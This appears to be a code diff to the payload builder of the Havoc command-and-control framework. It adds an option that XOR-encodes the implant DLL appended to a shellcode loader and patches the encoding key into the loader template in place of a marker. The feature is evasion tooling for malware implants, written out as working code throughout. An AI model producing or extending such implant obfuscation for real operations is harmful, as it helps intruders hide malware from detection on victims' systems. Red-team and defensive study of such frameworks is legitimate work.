@@ -2,7 +2,8 @@ package builder
 
 import (
 	"bytes"
-	//"encoding/hex"
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -113,6 +114,9 @@ type Builder struct {
 
 		ModuleStomping       bool
 		ModuleStompingTarget string
+
+		PayloadEncode    bool
+		PayloadEncodeKey string
 	}
 
 	ImplantOptions struct {
@@ -447,6 +451,18 @@ func (b *Builder) Build() bool {
 				b.SendConsoleMessage("Info", fmt.Sprintf("module stomping enabled [%s]", b.config.ModuleStompingTarget))
 			}
 
+			// patch the encoding key into the loader template, then encode the appended DLL
+			if b.config.PayloadEncode {
+				ShellcodeTemplate, err = b.PatchCryptKey(ShellcodeTemplate)
+				if err != nil {
+					logger.Error("Payload encoding setup failed: " + err.Error())
+					b.SendConsoleMessage("Error", "payload encoding setup failed: "+err.Error())
+					return false
+				}
+				CryptEncodeBuffer(DllPayloadBytes, []byte(b.config.PayloadEncodeKey))
+				b.SendConsoleMessage("Info", fmt.Sprintf("payload encoding enabled (xor keystream, key: %s)", b.config.PayloadEncodeKey))
+			}
+
 			Shellcode = append(ShellcodeTemplate, DllPayloadBytes...)
 			b.SendConsoleMessage("Info", fmt.Sprintf("shellcode payload [%v bytes]", len(Shellcode)))
 
@@ -503,6 +519,17 @@ func (b *Builder) SetArch(Arch int) {
 func (b *Builder) SetModuleStomping(Enabled bool, Target string) {
 	b.config.ModuleStomping = Enabled
 	b.config.ModuleStompingTarget = Target
+}
+
+func (b *Builder) SetPayloadEncode(Enabled bool, Key string) {
+	b.config.PayloadEncode = Enabled
+	b.config.PayloadEncodeKey = Key
+}
+
+// GetPayloadEncodeKey returns the encoding key actually used (the operator-provided
+// key, or the auto-generated random one). only meaningful after PatchCryptKey ran.
+func (b *Builder) GetPayloadEncodeKey() string {
+	return b.config.PayloadEncodeKey
 }
 
 func (b *Builder) SetConfig(Config string) error {
@@ -580,6 +607,60 @@ func (b *Builder) PatchModuleStomping(Template []byte) ([]byte, error) {
 	Template = bytes.Replace(Template, []byte{EnabledMarker}, []byte{0x01}, 1)
 
 	return Template, nil
+}
+
+// CryptEncodeBuffer applies the same symmetric keystream XOR the loader uses to
+// decode. must stay byte-for-byte identical to CryptDecodeBuffer in
+// payloads/Shellcode/Source/Utils.c
+func CryptEncodeBuffer(Buffer []byte, Key []byte) {
+	var State uint32 = 0x811c9dc5 // fnv1a basis
+	for _, k := range Key {
+		State ^= uint32(k)
+		State *= 0x01000193 // fnv1a prime
+	}
+	for i := range Buffer {
+		State += 0x6D2B79F5
+		var Stream = State
+		Stream = (Stream ^ (Stream >> 15)) * (Stream | 1)
+		Stream ^= Stream + ((Stream ^ (Stream >> 7)) * (Stream | 61))
+		Buffer[i] ^= byte((Stream ^ (Stream >> 14)) & 0xFF)
+	}
+}
+
+// PatchCryptKey replaces the loader's default key marker with the build key and
+// resolves any empty key into a random one (exposed via PayloadEncodeKey).
+func (b *Builder) PatchCryptKey(Template []byte) ([]byte, error) {
+	const (
+		Marker    = "HAVOC_CRYPT_KEY_MARKER"
+		KeySlot   = 32 // CHAR gCryptKey[32] (31 chars + NUL)
+		MaxKeyLen = KeySlot - 1
+	)
+
+	key := b.config.PayloadEncodeKey
+	if strings.TrimSpace(key) == "" {
+		// no key provided: generate a random one and surface it to the operator
+		rnd := make([]byte, 16)
+		if _, err := rand.Read(rnd); err != nil {
+			return nil, fmt.Errorf("failed to generate a random key: %v", err)
+		}
+		key = hex.EncodeToString(rnd) // 32 hex chars
+		b.config.PayloadEncodeKey = key
+	}
+
+	if len(key) > MaxKeyLen {
+		return nil, fmt.Errorf("payload encoding key too long: %d chars (max %d)", len(key), MaxKeyLen)
+	}
+
+	// build the fixed-width ascii marker & key (padded with NUL for replacement)
+	marker := make([]byte, KeySlot)
+	copy(marker, Marker)
+	keyBuf := make([]byte, KeySlot)
+	copy(keyBuf, key)
+
+	if !bytes.Contains(Template, marker) {
+		return nil, errors.New("crypt key marker not found in shellcode template (rebuild payloads/Shellcode)")
+	}
+	return bytes.ReplaceAll(Template, marker, keyBuf), nil
 }
 
 func (b *Builder) Patch(ByteArray []byte) []byte {
